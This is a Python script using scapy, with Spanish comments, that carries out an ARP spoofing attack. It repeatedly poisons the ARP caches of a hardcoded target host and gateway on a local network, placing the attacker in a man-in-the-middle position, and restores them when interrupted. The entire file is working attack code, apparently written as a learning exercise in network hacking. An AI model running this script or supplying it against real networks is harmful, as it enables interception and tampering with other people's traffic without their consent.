#!/usr/bin/env python
import sys
import scapy.all as scapy
import time


def get_mac(ip):
    """
    Obtiene la dirección MAC de un IP dado en la red local.

    :param ip: Dirección IP para la que se buscará la dirección MAC.
    :return: La dirección MAC encontrada.
    """
    arp_request = scapy.ARP(pdst=ip)  # Crea una petición ARP para la dirección IP especificada.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Define una dirección de broadcast Ethernet.
    arp_request_broadcast = broadcast / arp_request  # Combina las dos solicitudes en una sola.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[
        0]  # Envía la solicitud y recoge la respuesta.
    return answered_list[0][1].hwsrc  # Devuelve la dirección MAC de la primera respuesta recibida.


def spoof(target_ip, spoof_ip):
    """
    Realiza un ataque de ARP spoofing entre dos IP.

    :param target_ip: La dirección IP del objetivo a 'spoofear'.
    :param spoof_ip: La dirección IP que se usará para suplantar.
    """
    target_mac = get_mac(target_ip)  # Obtiene la dirección MAC del objetivo.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)  # Crea un paquete ARP con la dirección IP y MAC objetivo y la IP suplantada.
    scapy.send(packet, verbose=False)  # Envía el paquete ARP.


def restore(destination_ip, source_ip):
    """
    Restaura la configuración de red normal entre dos IP tras un ataque de ARP spoofing.

    :param destination_ip: La dirección IP del dispositivo de destino.
    :param source_ip: La dirección IP del dispositivo fuente.
    """
    destination_mac = get_mac(destination_ip)  # Obtiene la MAC del dispositivo de destino.
    source_mac = get_mac(source_ip)  # Obtiene la MAC del dispositivo fuente.
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,
                       hwsrc=source_mac)  # Crea un paquete ARP para restaurar la configuración.
    scapy.send(packet, count=4, verbose=False)  # Envía el paquete varias veces para asegurar la restauración.


# Direcciones IP de los dispositivos involucrados.
target_ip = "192.168.100.5"
gateway_ip = "192.168.100.1"

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)  # Spoofea el dispositivo objetivo.
        spoof(gateway_ip, target_ip)  # Spoofea el gateway.
        sent_packets_count += 2
        print("\r Packages sent:" + str(sent_packets_count), end="")  # Imprime el número de paquetes enviados.
        sys.stdout.flush()  # Fuerza la impresión en pantalla.
        time.sleep(2)  # Espera 2 segundos antes de enviar los siguientes paquetes.
except KeyboardInterrupt:
    print("[+]CTRL detected...quitting")  # Mensaje de salida.
    restore(target_ip, gateway_ip)  # Restaura la configuración del dispositivo objetivo.
    restore(gateway_ip, target_ip)  # Restaura la configuración del gateway.
